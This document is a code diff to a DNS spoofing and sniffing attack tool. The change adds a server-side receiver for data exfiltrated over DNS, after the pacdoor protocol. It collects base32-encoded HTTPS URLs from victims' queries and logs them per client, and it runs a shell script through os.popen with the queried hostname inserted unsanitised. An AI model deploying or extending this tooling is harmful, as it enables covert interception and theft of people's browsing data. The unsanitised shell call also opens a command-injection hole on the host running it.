@@ -33,6 +33,7 @@ from time import sleep
 import argparse
 import json
 import sys
+from base64 import b32decode
 
 consultas = {}
 spoof = {}
@@ -41,7 +42,7 @@ nospoof = []
 nospoofto = []
 victims = []
 
-
+HTTPS_URLS_FILE = "https_urls_log.txt"
 LOGREQFILE = "dnslog.txt"
 LOGSNIFFFILE = "snifflog.txt"
 LOGALERTFILE = "dnsalert.txt"
@@ -52,7 +53,7 @@ nospoof_file = "nospoof.cfg"
 nospoofto_file = "nospoofto.cfg"
 specific_file = "spoof.cfg"
 dominios_file = "domains.cfg"
-
+exfil_file = "exfil.cfg"
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-N", "--noforward", help="DNS Fowarding OFF (default ON)", action="store_true")
@@ -74,7 +75,7 @@ ip2 = args.ip2
 Forward = not args.noforward
 translate_file = args.hsts
 hsts_dictionary = {}
-
+exfil = []
 
 fake_ips = []
 # List of of ips
@@ -116,6 +117,8 @@ def process_files():
     global nospoofto_file
     global translate_file
     global hsts_dictionary
+    global exfil
+    global victims
 
     for i in nospoof[:]:
         nospoof.remove(i)
@@ -144,6 +147,15 @@ def process_files():
             nospoof.append(h[0])
 
     nsfile.close()
+
+    with open(exfil_file,'r') as nsfile2:
+        for line in nsfile2:
+            if line[0] == '#':
+                continue
+            h = line.split()
+            if len(h) > 0:
+                DEBUGLOG('Exfil domain ' + h[0])
+                exfil.append(h[0])
 
     nsfile = open(victim_file, 'r')
     for line in nsfile:
@@ -190,17 +202,51 @@ def process_files():
     return
 
 
-def DEBUGLOG(str):
+def DEBUGLOG(str,dtype = 'normal'):
     global debug
-    if debug:
+    if debug and dtype == 'normal':
         print str
     sys.stdout.flush()
     return
 
-
+# External script to be executed when a host for a domain in domains.cfg is requested
 def handler_msg(id):
-    #os.popen('/usr/bin/sendTelegramMsg.sh leo_leo  " Alert document %s" > /dev/null 2> /dev/null &'%id)
+    os.popen('./handler_msg.sh %s'%id)
     return
+
+# Handler for the exfiltration of data, protocol from https://github.com/SafeBreach-Labs/pacdoor
+# Host domain must be in the exfiltration config file exfil.cfg
+channels = {}
+def handler_exfiltration_domain(host, client):
+    info = host.split(".")
+    channel = info[1]
+    if info[0].upper() == 'O':
+        channels[channel] = {}
+        channels[channel]["len"]=int(info[2][2:])
+        channels[channel]["lastid"]=0
+        channels[channel]["data"]={}
+        channels[channel]["client"]=client
+        DEBUGLOG("New channel %s added for client %s"%(channel,client))
+        return '200.0.0.1'
+    if info[0].upper() == 'W':
+        if channel not in channels:
+            return '200.0.0.6'
+        DEBUGLOG("New data %s added for channel %s"%(info[2][1:],channel))
+        channel_idx = int(info[2][1:])
+        channels[channel]["data"][channel_idx] = info[3]
+        if len(channels[channel]["data"]) == channels[channel]["len"]:
+            data = ''
+            for i in range(0,channels[channel]["len"]):
+                data = data + channels[channel]["data"][i]
+            decoded = b32decode(data.upper())
+            DEBUGLOG("****             URL: %s"%decoded)
+            with open(HTTPS_URLS_FILE,"a") as f:
+                f.write("%s -> %s\n"%(channels[channel]["client"],decoded))
+            # TODO: Administrar respuestas
+            return '200.0.0.1'
+    return '200.0.0.6'
+
+
 
 ######################
 # SNIFFER SECTION    #
@@ -284,7 +330,6 @@ def go():
         ip1, ip1, adminip)
     DEBUGLOG( "Starting sniffing in (%s = %s)...." % (dev, ip1))
     sniff(prn=parse_packet,store=0,filter=bpffilter)
-
 
 ######################
 #  DNS SECTION       #
@@ -540,31 +585,38 @@ def std_A_qry(msg, prov_ip):
         # punto = host.find(".")
         # dominio = host[punto:]
 
-        if (dominio in dominios) or (dom1 in dominios):
-            ttl = 1
-            id = host[:punto2]
-            if dom1 in dominios:
-                id = host[:punto1]
-                dominio = dom1
+        if dominio[1:] in exfil:
+            respuesta = handler_exfiltration_domain(qname,prov_ip)
+            if respuesta is not None:
+                rrset = dns.rrset.from_text(q.name, 1, dns.rdataclass.IN, dns.rdatatype.A, respuesta)
+                resp.answer.append(rrset)
+                return resp, dosleep
+        else:
+            if ((dominio in dominios) or (dom1 in dominios)) and (qname.lower() not in spoof):
+                ttl = 1
+                id = host[:punto2]
+                if dom1 in dominios:
+                    id = host[:punto1]
+                    dominio = dom1
 
-            if not id == 'www':
-                DEBUGLOG('Alert domain! ID: ' + id)
-                # Here the HANDLE!
-                #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
-                handler_msg(id)
-                save_req(LOGALERTFILE, 'Alert domain! ID: ' + id + '\n')
-            DEBUGLOG('Responding with IP = ' + dominios[dominio])
-            rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
-            resp.answer.append(rrset)
-            return resp, dosleep
+                if not id == 'www':
+                    DEBUGLOG('Alert domain! ID: ' + id)
+                    # Here the HANDLE!
+                    #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
+                    handler_msg(qname)
+                    save_req(LOGALERTFILE, 'Alert domain! ID: ' + id + '\n')
+                DEBUGLOG('Responding with IP = ' + dominios[dominio])
+                rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
+                resp.answer.append(rrset)
+                return resp, dosleep
 
-        if ".%s"%host in dominios:
-            dominio = ".%s"%host
-            ttl = 1
-            DEBUGLOG('Responding with IP = ' + dominios[dominio])
-            rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
-            resp.answer.append(rrset)
-            return resp, dosleep
+            if ".%s"%host in dominios:
+                dominio = ".%s"%host
+                ttl = 1
+                DEBUGLOG('Responding with IP = ' + dominios[dominio])
+                rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
+                resp.answer.append(rrset)
+                return resp, dosleep
         
         #print dominio[1:]
         if qname.lower() not in spoof:
